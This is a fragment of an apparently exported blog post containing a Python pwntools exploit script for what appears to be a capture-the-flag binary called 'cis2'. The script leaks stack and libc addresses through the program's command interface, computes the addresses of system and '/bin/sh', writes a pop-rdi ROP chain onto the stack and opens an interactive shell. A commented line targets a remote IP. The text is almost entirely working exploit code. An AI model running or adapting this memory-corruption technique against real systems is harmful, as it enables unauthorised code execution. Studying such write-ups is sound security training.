class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./cis2'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.37.31',23333)</span></div><div class=\"line\"></div><div class=\"line\">pop_rdi_ret=int(<span class=\"string\">'0x400ad3'</span>,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(high,value,low)</span>:</span></div><div class=\"line\">\t<span class=\"comment\"># first move down</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(high):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(value))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'write value: '</span>+hex(c_uint32(value).value)</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'m'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(low):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Fight!\\n\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># begin</span></div><div class=\"line\">\t<span class=\"comment\"># first get stack addr</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\taddr=p.recvline().strip()</div><div class=\"line\">\taddr=int(addr,<span class=\"number\">10</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak stack addr: '</span>+hex(c_uint32(addr).value)</div><div class=\"line\">\tstack_addr=addr<span class=\"number\">-420</span></div><div class=\"line\">\tdest_addr=stack_addr+<span class=\"number\">65</span>*<span class=\"number\">4</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'modify base addr to: '</span>+hex(c_uint32(dest_addr).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">9</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(dest_addr))</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'+'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now values[index] should point to __libc_start_main's address prefix</span></div><div class=\"line\">\t<span class=\"comment\"># first leak libc_prefix</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_prefix=p.recvline().strip()</div><div class=\"line\">\tlibc_prefix=int(libc_prefix,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc prefix: '</span>+hex(c_uint32(libc_prefix).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now leak libc other address</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_addr=p.recvline().strip()</div><div class=\"line\">\tlibc_addr=int(libc_addr,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc addr: '</span>+hex(c_uint32(libc_addr).value)</div><div class=\"line\"></div><div class=\"line\">\tlibc_addr=libc_addr<span class=\"number\">-245</span></div><div class=\"line\">\t<span class=\"comment\"># I used libc-database to search the version of glibc on the remote once but I get nothing.</span></div><div class=\"line\">\t<span class=\"comment\"># So I failed to get shell from remote.</span></div><div class=\"line\">\tsys_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x414f0</span></div><div class=\"line\">\tbinsh_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x161160</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#################################################################################</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write pop gadget addr into stack </span></div><div class=\"line\">\tw(<span class=\"number\">17</span>,pop_rdi_ret,<span class=\"number\">19</span>)</div><div class=\"line\">\tw(<span class=\"number\">17</span>,<span class=\"number\">0</span>,<span class=\"number\">18</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write /bin/sh addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">16</span>,binsh_addr,<span class=\"number\">17</span>)</div><div class=\"line\">\tw(<span class=\"number\">15</span>,libc_prefix,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write sys addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">14</span>,sys_addr,<span class=\"number\">15</span>)</div><div class=\"line\">\tw(<span class=\"number\">13</span>,libc_prefix,<span class=\"number\">14</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># gdb.attach(p,'b *0x400987')</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'q'</span>)</div><div class=\"line\">\t<span class=\"comment\"># get shell</span></div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}